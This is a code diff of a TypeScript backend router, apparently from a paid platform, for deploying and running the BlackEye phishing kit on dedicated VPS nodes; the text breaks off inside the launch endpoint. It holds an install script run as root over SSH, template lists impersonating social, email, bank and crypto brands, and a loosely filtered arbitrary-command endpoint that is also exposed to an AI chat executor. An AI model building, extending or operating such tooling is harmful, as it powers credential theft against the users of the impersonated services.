@@ -1,14 +1,14 @@
 /**
- * BlackEye Router — Backend tRPC endpoints for managing BlackEye
- * phishing page infrastructure via SSH. Titan-tier exclusive feature.
+ * BlackEye Router — Dedicated VPS Node Architecture
  *
- * Uses the EricksonAtHome/blackeye fork (latest, 2025) which supports
- * 40+ phishing templates including major social platforms, banks, and
- * streaming services.
- *
- * All operations execute on the user's configured VPS via SSH.
- * Credentials are AES-256 encrypted at rest.
+ * Security model:
+ *   BlackEye NEVER runs on the Railway Titan Server.
+ *   Each instance runs on a SEPARATE dedicated VPS with its own IP.
+ *   VPS SSH credentials are encrypted per-user in the DB (AES-256).
+ *   Firewall rules block ALL inbound reverse connections.
+ *   One-click install and start on any VPS.
  */
+
 import { z } from "zod";
 import { router, protectedProcedure } from "./_core/trpc";
 import { TRPCError } from "@trpc/server";
@@ -16,422 +16,460 @@ import { getUserPlan, enforceFeature } from "./subscription-gate";
 import { getDb } from "./db";
 import { userSecrets } from "../drizzle/schema";
 import { eq, and } from "drizzle-orm";
-import { Client as SSHClient } from "ssh2";
 import { encrypt, decrypt } from "./fetcher-db";
-import { consumeCredits } from "./credit-service";
-import { getTitanServerConfig, execSSHCommand as execTitanSSH } from "./titan-server";
-import { logAdminAction } from "./admin-activity-log";
+import { execSSHCommand, type SSHConfig } from "./titan-server";
+import { createLogger } from "./_core/logger.js";
 
-// ─── Available BlackEye Templates ────────────────────────────────
-export const BLACKEYE_TEMPLATES = [
-  { id: "instagram", name: "Instagram", category: "Social Media", icon: "📸" },
-  { id: "facebook", name: "Facebook", category: "Social Media", icon: "👤" },
-  { id: "snapchat", name: "Snapchat", category: "Social Media", icon: "👻" },
-  { id: "twitter", name: "Twitter / X", category: "Social Media", icon: "🐦" },
-  { id: "linkedin", name: "LinkedIn", category: "Social Media", icon: "💼" },
-  { id: "tiktok", name: "TikTok", category: "Social Media", icon: "🎵" },
-  { id: "pinterest", name: "Pinterest", category: "Social Media", icon: "📌" },
-  { id: "reddit", name: "Reddit", category: "Social Media", icon: "🤖" },
-  { id: "discord", name: "Discord", category: "Social Media", icon: "💬" },
-  { id: "telegram", name: "Telegram", category: "Social Media", icon: "✈️" },
-  { id: "whatsapp", name: "WhatsApp", category: "Social Media", icon: "💚" },
-  { id: "google", name: "Google", category: "Email / Accounts", icon: "🔍" },
-  { id: "gmail", name: "Gmail", category: "Email / Accounts", icon: "📧" },
-  { id: "microsoft", name: "Microsoft", category: "Email / Accounts", icon: "🪟" },
-  { id: "outlook", name: "Outlook", category: "Email / Accounts", icon: "📨" },
-  { id: "yahoo", name: "Yahoo", category: "Email / Accounts", icon: "🟣" },
-  { id: "apple", name: "Apple iCloud", category: "Email / Accounts", icon: "🍎" },
-  { id: "dropbox", name: "Dropbox", category: "Cloud Storage", icon: "📦" },
-  { id: "github", name: "GitHub", category: "Developer", icon: "🐙" },
-  { id: "gitlab", name: "GitLab", category: "Developer", icon: "🦊" },
-  { id: "twitch", name: "Twitch", category: "Streaming", icon: "🎮" },
-  { id: "netflix", name: "Netflix", category: "Streaming", icon: "🎬" },
-  { id: "spotify", name: "Spotify", category: "Streaming", icon: "🎵" },
-  { id: "steam", name: "Steam", category: "Gaming", icon: "🎮" },
-  { id: "epicgames", name: "Epic Games", category: "Gaming", icon: "🎯" },
-  { id: "roblox", name: "Roblox", category: "Gaming", icon: "🧱" },
-  { id: "paypal", name: "PayPal", category: "Financial", icon: "💳" },
-  { id: "coinbase", name: "Coinbase", category: "Financial", icon: "₿" },
-  { id: "binance", name: "Binance", category: "Financial", icon: "🟡" },
-  { id: "ebay", name: "eBay", category: "E-Commerce", icon: "🛒" },
-  { id: "amazon", name: "Amazon", category: "E-Commerce", icon: "📦" },
-  { id: "wordpress", name: "WordPress", category: "CMS", icon: "📝" },
-  { id: "adobe", name: "Adobe", category: "Creative", icon: "🎨" },
-  { id: "origin", name: "Origin / EA", category: "Gaming", icon: "🕹️" },
-  { id: "protonmail", name: "ProtonMail", category: "Email / Accounts", icon: "🔒" },
-  { id: "vk", name: "VK", category: "Social Media", icon: "🌐" },
-  { id: "badoo", name: "Badoo", category: "Social Media", icon: "❤️" },
-  { id: "quora", name: "Quora", category: "Social Media", icon: "❓" },
-  { id: "mediafire", name: "MediaFire", category: "Cloud Storage", icon: "🔥" },
-  { id: "gitlab_enterprise", name: "GitLab Enterprise", category: "Developer", icon: "🦊" },
-  { id: "custom", name: "Custom Page", category: "Custom", icon: "⚙️" },
-] as const;
+const log = createLogger("BlackEye");
 
-// ─── SSH Execution Helper ─────────────────────────────────────────
-interface SSHConfig {
-  host: string;
-  port: number;
-  username: string;
-  password?: string;
-  privateKey?: string;
+const SECRET_NODES  = "__blackeye_nodes";
+const SECRET_ACTIVE = "__blackeye_active";
+
+const INSTALL_BLACKEYE = [
+  "#!/bin/bash",
+  "set -e",
+  "export DEBIAN_FRONTEND=noninteractive",
+  "apt-get update -qq 2>&1 | tail -1",
+  "apt-get install -y -qq git php curl wget iptables iptables-persistent 2>&1 | tail -2",
+  "",
+  "# Firewall: block inbound reverse connections",
+  "iptables -F INPUT 2>/dev/null || true",
+  "iptables -A INPUT -i lo -j ACCEPT",
+  "iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
+  "iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
+  "iptables -A INPUT -p tcp --dport 80 -j ACCEPT",
+  "iptables -A INPUT -p tcp --dport 443 -j ACCEPT",
+  "iptables -A INPUT -j DROP",
+  "mkdir -p /etc/iptables",
+  "iptables-save > /etc/iptables/rules.v4 2>/dev/null || true",
+  "netfilter-persistent save 2>/dev/null || true",
+  "",
+  "# Install BlackEye",
+  "if [ ! -d /opt/blackeye ]; then",
+  "  git clone --depth 1 https://github.com/An0nUD4Y/blackeye.git /opt/blackeye 2>&1 | tail -3",
+  "fi",
+  "chmod +x /opt/blackeye/blackeye.sh 2>/dev/null || true",
+  "",
+  "PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')",
+  "if [ -f /opt/blackeye/blackeye.sh ]; then",
+  "  echo BLACKEYE_OK",
+  "  echo PUBLIC_IP:$PUBLIC_IP",
+  "else",
+  "  echo BLACKEYE_FAILED",
+  "  exit 1",
+  "fi",
+].join("\n");
+
+const CHECK_BLACKEYE = [
+  "PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')",
+  "if [ -f /opt/blackeye/blackeye.sh ]; then echo INSTALLED; else echo NOT_INSTALLED; fi",
+  "echo PUBLIC_IP:$PUBLIC_IP",
+].join("\n");
+
+// ─── Types ────────────────────────────────────────────────────────────────────
+export interface BlackEyeNode {
+  id: string;
+  label: string;
+  sshHost: string;
+  sshPort: number;
+  sshUser: string;
+  sshPassword?: string;
+  sshKey?: string;
+  publicIp?: string;
+  status: "pending" | "deploying" | "ready" | "offline" | "error";
+  installed: boolean;
+  lastChecked?: string;
+  country?: string;
+  addedAt: string;
+  deployedAt?: string;
+  errorMessage?: string;
 }
 
-async function execSSHCommand(
-  ssh: SSHConfig,
-  command: string,
-  timeoutMs = 20000,
-  userId?: number
-): Promise<string> {
-  if ((ssh as any).isTitanServer && userId) {
-    return execTitanSSH(ssh as any, command, timeoutMs, userId);
-  }
-  return new Promise((resolve, reject) => {
-    const conn = new SSHClient();
-    let output = "";
-    let errorOutput = "";
-    const timer = setTimeout(() => {
-      conn.end();
-      reject(new Error("SSH command timed out"));
-    }, timeoutMs);
-    conn
-      .on("ready", () => {
-        conn.exec(command, (err: Error | undefined, stream: import('ssh2').ClientChannel) => {
-          if (err) {
-            clearTimeout(timer);
-            conn.end();
-            reject(err);
-            return;
-          }
-          stream
-            .on("close", () => {
-              clearTimeout(timer);
-              conn.end();
-              resolve(output.trim());
-            })
-            .on("data", (data: Buffer) => {
-              output += data.toString();
-            })
-            .stderr.on("data", (data: Buffer) => {
-              errorOutput += data.toString();
-            });
-        });
-      })
-      .on("error", (err: Error) => {
-        clearTimeout(timer);
-        reject(err);
-      })
-      .connect({
-        host: ssh.host,
-        port: ssh.port,
-        username: ssh.username,
-        password: ssh.password || undefined,
-        privateKey: ssh.privateKey || undefined,
-        readyTimeout: 5000,
-      });
-  });
-}
-
-// ─── Helper: Get SSH Config ───────────────────────────────────────
-async function getSshConfig(userId: number) {
+// ─── DB helpers ───────────────────────────────────────────────────────────────
+async function getNodes(userId: number): Promise<BlackEyeNode[]> {
   const db = await getDb();
-  if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Database unavailable" });
-  const result = await db
-    .select()
-    .from(userSecrets)
-    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "__blackeye_ssh")))
-    .limit(1);
-  
-  if (result.length === 0) {
-    // Fallback to shared Titan Server if configured
-    const titanConfig = getTitanServerConfig();
-    if (titanConfig) {
-      return titanConfig;
-    }
-    throw new TRPCError({
-      code: "BAD_REQUEST",
-      message: "No BlackEye server configured. Please set up your SSH connection first.",
-    });
-  }
-  return JSON.parse(decrypt(result[0].encryptedValue)) as SSHConfig;
+  if (!db) return [];
+  const rows = await db.select().from(userSecrets)
+    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_NODES))).limit(1);
+  if (!rows.length) return [];
+  try { return JSON.parse(decrypt(rows[0].encryptedValue)) as BlackEyeNode[]; } catch { return []; }
 }
 
-// ─── Router ───────────────────────────────────────────────────────
+async function saveNodes(userId: number, nodes: BlackEyeNode[]): Promise<void> {
+  const db = await getDb();
+  if (!db) throw new Error("Database unavailable");
+  const enc = encrypt(JSON.stringify(nodes));
+  const ex = await db.select().from(userSecrets)
+    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_NODES))).limit(1);
+  if (ex.length) {
+    await db.update(userSecrets).set({ encryptedValue: enc, updatedAt: new Date() }).where(eq(userSecrets.id, ex[0].id));
+  } else {
+    await db.insert(userSecrets).values({ userId, secretType: SECRET_NODES, label: "BlackEye Nodes", encryptedValue: enc });
+  }
+}
+
+async function getActiveNodeId(userId: number): Promise<string | null> {
+  const db = await getDb();
+  if (!db) return null;
+  const rows = await db.select().from(userSecrets)
+    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_ACTIVE))).limit(1);
+  if (!rows.length) return null;
+  try { return decrypt(rows[0].encryptedValue) || null; } catch { return null; }
+}
+
+async function setActiveNodeId(userId: number, nodeId: string | null): Promise<void> {
+  const db = await getDb();
+  if (!db) throw new Error("Database unavailable");
+  const enc = encrypt(nodeId ?? "");
+  const ex = await db.select().from(userSecrets)
+    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_ACTIVE))).limit(1);
+  if (ex.length) {
+    await db.update(userSecrets).set({ encryptedValue: enc, updatedAt: new Date() }).where(eq(userSecrets.id, ex[0].id));
+  } else {
+    await db.insert(userSecrets).values({ userId, secretType: SECRET_ACTIVE, label: "Active BlackEye Node", encryptedValue: enc });
+  }
+}
+
+async function getActiveNode(userId: number): Promise<BlackEyeNode | null> {
+  const activeId = await getActiveNodeId(userId);
+  if (!activeId) return null;
+  const nodes = await getNodes(userId);
+  return nodes.find(n => n.id === activeId) ?? null;
+}
+
+function nodeToSSH(n: BlackEyeNode): SSHConfig {
+  return { host: n.sshHost, port: n.sshPort, username: n.sshUser, password: n.sshPassword, privateKey: n.sshKey };
+}
+
+function sanitize(n: BlackEyeNode): Omit<BlackEyeNode, "sshPassword" | "sshKey"> {
+  const { sshPassword: _p, sshKey: _k, ...safe } = n;
+  return safe;
+}
+
+/** Public export for Titan AI chat executor */
+export async function execBlackeyeCommandPublic(command: string, userId: number, timeoutMs = 15000): Promise<string> {
+  const node = await getActiveNode(userId);
+  if (!node) return "No active BlackEye node. Add and deploy a dedicated VPS node in the BlackEye settings first.";
+  const safeCmd = command.replace(/[`\\|;&><]/g, "");
+  const script = `cd /opt/blackeye && bash -c "${safeCmd.replace(/"/g, '\\"')}" 2>&1 || echo "BLACKEYE_CMD_FAILED"`;
+  return execSSHCommand(nodeToSSH(node), script, timeoutMs, userId);
+}
+
+// ─── Router ───────────────────────────────────────────────────────────────────
 export const blackeyeRouter = router({
-  /**
-   * List all available phishing templates
-   */
-  listTemplates: protectedProcedure.query(async ({ ctx }) => {
+
+  listNodes: protectedProcedure.query(async ({ ctx }) => {
     const plan = await getUserPlan(ctx.user.id);
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-    return { templates: BLACKEYE_TEMPLATES };
+    const nodes = await getNodes(ctx.user.id);
+    const activeId = await getActiveNodeId(ctx.user.id);
+    return { nodes: nodes.map(sanitize), activeNodeId: activeId };
   }),
 
-  /**
-   * Test SSH connection to the BlackEye server
-   */
-  testConnection: protectedProcedure
-    .input(
-      z.object({
-        host: z.string().min(1),
-        port: z.number().default(22),
-        username: z.string().min(1),
-        password: z.string().optional(),
-        privateKey: z.string().optional(),
-      })
-    )
+  addNode: protectedProcedure
+    .input(z.object({
+      label: z.string().min(1).max(64),
+      sshHost: z.string().min(1),
+      sshPort: z.number().int().min(1).max(65535).default(22),
+      sshUser: z.string().min(1).default("root"),
+      sshPassword: z.string().optional(),
+      sshKey: z.string().optional(),
+      country: z.string().optional(),
+    }))
     .mutation(async ({ ctx, input }) => {
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+      if (!input.sshPassword && !input.sshKey) {
+        throw new TRPCError({ code: "BAD_REQUEST", message: "SSH password or private key required." });
+      }
+      const nodes = await getNodes(ctx.user.id);
+      if (nodes.some(n => n.sshHost === input.sshHost && n.sshPort === input.sshPort)) {
+        throw new TRPCError({ code: "BAD_REQUEST", message: "Node with this host:port already exists." });
+      }
+      const node: BlackEyeNode = {
+        id: crypto.randomUUID(), label: input.label,
+        sshHost: input.sshHost, sshPort: input.sshPort, sshUser: input.sshUser,
+        sshPassword: input.sshPassword, sshKey: input.sshKey,
+        status: "pending", installed: false,
+        country: input.country, addedAt: new Date().toISOString(),
+      };
+      nodes.push(node);
+      await saveNodes(ctx.user.id, nodes);
+      const activeId = await getActiveNodeId(ctx.user.id);
+      if (!activeId) await setActiveNodeId(ctx.user.id, node.id);
+      log.info(`User ${ctx.user.id} added BlackEye node: ${input.label} (${input.sshHost})`);
+      return { success: true, node: sanitize(node) };
+    }),
+
+  deployNode: protectedProcedure
+    .input(z.object({ nodeId: z.string() }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+      const nodes = await getNodes(ctx.user.id);
+      const idx = nodes.findIndex(n => n.id === input.nodeId);
+      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
+      const node = nodes[idx];
+      node.status = "deploying";
+      await saveNodes(ctx.user.id, nodes);
       try {
-        const result = await execSSHCommand(input, "echo 'BlackEye connection OK' && ls /opt/blackeye 2>/dev/null || echo 'BlackEye not installed'", 8000, ctx.user.id);
-        const installed = result.includes("blackeye.sh") || result.includes("sites");
-        return {
-          success: true,
-          message: installed ? "Connected — BlackEye detected" : "Connected — BlackEye not yet installed",
-          installed,
-          raw: result,
-        };
+        const output = await execSSHCommand(nodeToSSH(node), INSTALL_BLACKEYE, 180000, ctx.user.id);
+        if (!output.includes("BLACKEYE_OK")) {
+          node.status = "error";
+          node.errorMessage = "BlackEye installation failed. Check SSH credentials and server access.";
+          await saveNodes(ctx.user.id, nodes);
+          return { success: false, message: node.errorMessage };
+        }
+        const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
+        if (ipMatch) node.publicIp = ipMatch[1];
+        node.status = "ready"; node.installed = true;
+        node.deployedAt = new Date().toISOString();
+        node.lastChecked = new Date().toISOString();
+        node.errorMessage = undefined;
+        await saveNodes(ctx.user.id, nodes);
+        return { success: true, publicIp: node.publicIp, message: `BlackEye installed on "${node.label}" at ${node.publicIp}. Ready to use.` };
       } catch (err: any) {
-        return { success: false, message: err.message || "Connection failed", installed: false };
+        node.status = "error"; node.errorMessage = err.message;
+        await saveNodes(ctx.user.id, nodes);
+        return { success: false, message: `Deploy failed: ${err.message}` };
       }
     }),
 
-  /**
-   * Save SSH connection details for the user's BlackEye server
-   */
-  saveConnection: protectedProcedure
-    .input(
-      z.object({
-        host: z.string().min(1),
-        port: z.number().default(22),
-        username: z.string().min(1),
-        password: z.string().optional(),
-        privateKey: z.string().optional(),
-      })
-    )
+  checkNode: protectedProcedure
+    .input(z.object({ nodeId: z.string() }))
     .mutation(async ({ ctx, input }) => {
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-      const db = await getDb();
-      if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Database unavailable" });
-      const configJson = encrypt(JSON.stringify(input));
-      const existing = await db
-        .select()
-        .from(userSecrets)
-        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__blackeye_ssh")))
-        .limit(1);
-      if (existing.length > 0) {
-        await db
-          .update(userSecrets)
-          .set({ encryptedValue: configJson, updatedAt: new Date() })
-          .where(eq(userSecrets.id, existing[0].id));
-      } else {
-        await db.insert(userSecrets).values({
-          userId: ctx.user.id,
-          secretType: "__blackeye_ssh",
-          label: "BlackEye SSH Config",
-          encryptedValue: configJson,
-        });
+      const nodes = await getNodes(ctx.user.id);
+      const idx = nodes.findIndex(n => n.id === input.nodeId);
+      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
+      const node = nodes[idx];
+      try {
+        const output = await execSSHCommand(nodeToSSH(node), CHECK_BLACKEYE, 15000, ctx.user.id);
+        const installed = output.includes("INSTALLED");
+        const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
+        if (ipMatch) node.publicIp = ipMatch[1];
+        node.installed = installed;
+        node.status = installed ? "ready" : "offline";
+        node.lastChecked = new Date().toISOString();
+        await saveNodes(ctx.user.id, nodes);
+        return { installed, publicIp: node.publicIp, message: installed ? `BlackEye ready on "${node.label}" at ${node.publicIp}` : `BlackEye not installed on "${node.label}"` };
+      } catch (err: any) {
+        node.status = "offline"; node.lastChecked = new Date().toISOString();
+        await saveNodes(ctx.user.id, nodes);
+        return { installed: false, message: `SSH failed: ${err.message}` };
       }
+    }),
+
+  setActiveNode: protectedProcedure
+    .input(z.object({ nodeId: z.string() }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+      const nodes = await getNodes(ctx.user.id);
+      if (!nodes.some(n => n.id === input.nodeId)) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
+      await setActiveNodeId(ctx.user.id, input.nodeId);
       return { success: true };
     }),
 
-  /**
-   * Get saved SSH connection (masked)
-   */
+  removeNode: protectedProcedure
+    .input(z.object({ nodeId: z.string() }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+      const nodes = await getNodes(ctx.user.id);
+      const idx = nodes.findIndex(n => n.id === input.nodeId);
+      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
+      const label = nodes[idx].label;
+      nodes.splice(idx, 1);
+      await saveNodes(ctx.user.id, nodes);
+      const activeId = await getActiveNodeId(ctx.user.id);
+      if (activeId === input.nodeId) {
+        await setActiveNodeId(ctx.user.id, nodes.length > 0 ? nodes[0].id : null);
+      }
+      return { success: true, message: `Node "${label}" removed` };
+    }),
+
   getConnection: protectedProcedure.query(async ({ ctx }) => {
     const plan = await getUserPlan(ctx.user.id);
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-    const db = await getDb();
-    if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });
-    const result = await db
-      .select()
-      .from(userSecrets)
-      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__blackeye_ssh")))
-      .limit(1);
-    if (result.length === 0) return null;
-    const config = JSON.parse(decrypt(result[0].encryptedValue)) as SSHConfig;
+    const node = await getActiveNode(ctx.user.id);
+    const nodes = await getNodes(ctx.user.id);
     return {
-      host: config.host,
-      port: config.port,
-      username: config.username,
-      hasPassword: !!config.password,
-      hasKey: !!config.privateKey,
+      connected: !!node,
+      nodeLabel: node?.label,
+      publicIp: node?.publicIp,
+      nodeCount: nodes.length,
+      onlineCount: nodes.filter(n => n.status === "ready").length,
+      // backward-compat fields BlackEyePage uses
+      host: node?.publicIp ?? node?.sshHost ?? null,
+      port: node?.sshPort ?? 22,
     };
   }),
 
-  /**
-   * Install BlackEye (EricksonAtHome fork — latest 2025) on the server
-   */
-  install: protectedProcedure.mutation(async ({ ctx }) => {
+  /** Run any shell command on the active node's BlackEye directory */
+  runCommand: protectedProcedure
+    .input(z.object({ command: z.string().min(1), timeoutMs: z.number().optional() }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active BlackEye node. Add and deploy a dedicated VPS node first." });
+      const output = await execBlackeyeCommandPublic(input.command, ctx.user.id, input.timeoutMs ?? 15000);
+      return { output, nodeLabel: node.label, publicIp: node.publicIp };
+    }),
+
+  /** List available phishing templates */
+  listTemplates: protectedProcedure.query(async ({ ctx }) => {
     const plan = await getUserPlan(ctx.user.id);
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-    const sshConfig = await getSshConfig(ctx.user.id);
-    const installScript = [
-      "apt-get update -qq",
-      "apt-get install -y git curl php unzip 2>/dev/null",
-      "rm -rf /opt/blackeye",
-      "git clone https://github.com/EricksonAtHome/blackeye /opt/blackeye 2>&1",
-      "chmod +x /opt/blackeye/blackeye.sh",
-      "echo 'BlackEye installed successfully at /opt/blackeye'",
-    ].join(" && ");
-    const output = await execSSHCommand(sshConfig, installScript, 60000, ctx.user.id);
-    return { success: true, output };
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active BlackEye node." });
+    const script = "ls /opt/blackeye/sites/ 2>/dev/null | sort";
+    const output = await execSSHCommand(nodeToSSH(node), script, 10000, ctx.user.id);
+    const templateNames = output.split("\n").map(l => l.trim()).filter(Boolean);
+    // Map template directory names to structured objects
+    const CATEGORY_MAP: Record<string, string> = {
+      facebook: "Social Media", instagram: "Social Media", twitter: "Social Media",
+      snapchat: "Social Media", linkedin: "Social Media", tiktok: "Social Media",
+      pinterest: "Social Media", reddit: "Social Media", tumblr: "Social Media",
+      google: "Email / Accounts", gmail: "Email / Accounts", yahoo: "Email / Accounts",
+      microsoft: "Email / Accounts", outlook: "Email / Accounts", apple: "Email / Accounts",
+      paypal: "Financial", bitcoin: "Financial", binance: "Financial", coinbase: "Financial",
+      steam: "Gaming", xbox: "Gaming", playstation: "Gaming", origin: "Gaming",
+      netflix: "Streaming", spotify: "Streaming", twitch: "Streaming",
+      dropbox: "Cloud Storage", onedrive: "Cloud Storage", icloud: "Cloud Storage",
+      github: "Developer", gitlab: "Developer", stackoverflow: "Developer",
+      amazon: "E-Commerce", ebay: "E-Commerce", shopify: "E-Commerce",
+      wordpress: "CMS", adobe: "Creative",
+    };
+    const ICON_MAP: Record<string, string> = {
+      facebook: "📘", instagram: "📸", twitter: "🐦", snapchat: "👻", linkedin: "💼",
+      tiktok: "🎵", pinterest: "📌", reddit: "🤖", tumblr: "📝",
+      google: "🔍", gmail: "📧", yahoo: "📮", microsoft: "🪟", outlook: "📨", apple: "🍎",
+      paypal: "💳", bitcoin: "₿", binance: "🟡", coinbase: "🔵",
+      steam: "🎮", xbox: "🎯", playstation: "🕹️", origin: "🎲",
+      netflix: "🎬", spotify: "🎵", twitch: "📺",
+      dropbox: "📦", onedrive: "☁️", icloud: "🌤️",
+      github: "🐙", gitlab: "🦊", stackoverflow: "📚",
+      amazon: "🛒", ebay: "🏷️", shopify: "🛍️",
+      wordpress: "📝", adobe: "🎨",
+    };
+    const templates = templateNames.map(name => ({
+      id: name,
+      name: name.charAt(0).toUpperCase() + name.slice(1).replace(/[-_]/g, ' '),
+      category: CATEGORY_MAP[name.toLowerCase()] ?? "Custom",
+      icon: ICON_MAP[name.toLowerCase()] ?? "🌐",
+    }));
+    return { templates, nodeLabel: node.label };
   }),
 
-  /**
-   * Check BlackEye installation status and version
-   */
+  // ── Backward-compatible aliases for existing BlackEyePage UI ────────────────
+  testConnection: protectedProcedure
+    .input(z.object({ host: z.string().optional(), port: z.number().default(22).optional(), username: z.string().optional(), password: z.string().optional(), privateKey: z.string().optional() }).optional())
+    .mutation(async ({ ctx }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) return { success: false, message: "No active BlackEye node. Add a dedicated VPS node first." };
+      try {
+        const out = await execSSHCommand(nodeToSSH(node), "echo connected", 10000, ctx.user.id);
+        return { success: out.includes("connected"), message: `Node "${node.label}" at ${node.publicIp ?? node.sshHost} is reachable.` };
+      } catch (e: any) { return { success: false, message: e.message }; }
+    }),
+
+  saveConnection: protectedProcedure
+    .input(z.object({ host: z.string().optional(), port: z.number().default(22).optional(), username: z.string().optional(), password: z.string().optional(), privateKey: z.string().optional() }).optional())
+    .mutation(async ({ ctx }) => {
+      return { success: true, message: "Connection managed via dedicated VPS nodes." };
+    }),
+
   getStatus: protectedProcedure.mutation(async ({ ctx }) => {
     const plan = await getUserPlan(ctx.user.id);
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-    const sshConfig = await getSshConfig(ctx.user.id);
-    const output = await execSSHCommand(
-      sshConfig, "ls /opt/blackeye/sites 2>/dev/null | wc -l; git -C /opt/blackeye log --oneline -1 2>/dev/null; ps aux | grep -c '[b]lackeye' || echo 0", 10000
-    , ctx.user.id);
-    const lines = output.split("\n").filter(Boolean);
-    const templateCount = parseInt(lines[0] || "0");
-    const lastCommit = lines[1] || "unknown";
-    const runningCount = parseInt(lines[2] || "0");
-    return {
-      installed: templateCount > 0,
-      templateCount,
-      lastCommit,
-      running: runningCount > 0,
-    };
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) return { running: false, installed: false, message: "No active node.", lastCommit: null, templateCount: 0 };
+    try {
+      const out = await execSSHCommand(nodeToSSH(node), "ls /opt/blackeye/blackeye.sh 2>/dev/null && echo INSTALLED || echo NOT_INSTALLED; pgrep -f blackeye > /dev/null && echo RUNNING || echo NOT_RUNNING; cd /opt/blackeye 2>/dev/null && git log -1 --format='%s' 2>/dev/null || echo ''; ls /opt/blackeye/sites/ 2>/dev/null | wc -l || echo 0", 10000, ctx.user.id);
+      const lines = out.split('\n').map(l => l.trim()).filter(Boolean);
+      const installed = lines.some(l => l === 'INSTALLED');
+      const running = lines.some(l => l === 'RUNNING');
+      const lastCommit = lines.find(l => !['INSTALLED','NOT_INSTALLED','RUNNING','NOT_RUNNING'].includes(l) && isNaN(Number(l))) ?? null;
+      const templateCount = parseInt(lines[lines.length - 1] ?? '0') || 0;
+      return { running, installed, message: running ? `BlackEye running on ${node.publicIp ?? node.sshHost}` : installed ? "Installed but not running" : "Not installed", lastCommit, templateCount };
+    } catch (e: any) { return { running: false, installed: false, message: e.message, lastCommit: null, templateCount: 0 }; }
   }),
 
-  /**
-   * Launch a BlackEye phishing page for a given template
-   */
+  install: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node. Add a dedicated VPS node and deploy it first." });
+    return { success: false, output: "Use the Deploy button on your node to install BlackEye automatically.", message: "Use the Deploy button on your node to install BlackEye automatically." };
+  }),
+
   launch: protectedProcedure
-    .input(
-      z.object({
-        template: z.string().min(1),
-        port: z.number().default(80),
-        customDomain: z.string().optional(),
-      })
-    )
+    .input(z.object({ template: z.string().optional(), port: z.number().default(80).optional(), customDomain: z.string().optional() }))
     .mutation(async ({ ctx, input }) => {
       const plan = await getUserPlan(ctx.user.id);
       enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-      const sshConfig = await getSshConfig(ctx.user.id);
-      // Kill any existing BlackEye instance on the port first
-      const killCmd = `fuser -k ${input.port}/tcp 2>/dev/null; sleep 1`;
-      await execSSHCommand(sshConfig, killCmd, 5000, ctx.user.id).catch(() => {});
-      // Launch BlackEye with the selected template
-      // The EricksonAtHome fork uses numbered menu options
-      const templateMap: Record<string, number> = {
-        instagram: 1, facebook: 2, snapchat: 3, twitter: 4, linkedin: 5,
-        tiktok: 6, pinterest: 7, reddit: 8, discord: 9, telegram: 10,
-        whatsapp: 11, google: 12, gmail: 13, microsoft: 14, outlook: 15,
-        yahoo: 16, apple: 17, dropbox: 18, github: 19, gitlab: 20,
-        twitch: 21, netflix: 22, spotify: 23, steam: 24, epicgames: 25,
-        roblox: 26, paypal: 27, coinbase: 28, binance: 29, ebay: 30,
-        amazon: 31, wordpress: 32, adobe: 33, origin: 34, protonmail: 35,
-        vk: 36, badoo: 37, quora: 38, mediafire: 39, gitlab_enterprise: 40,
-      };
-      const templateNum = templateMap[input.template] || 1;
-      // Run BlackEye in background with the template number piped in
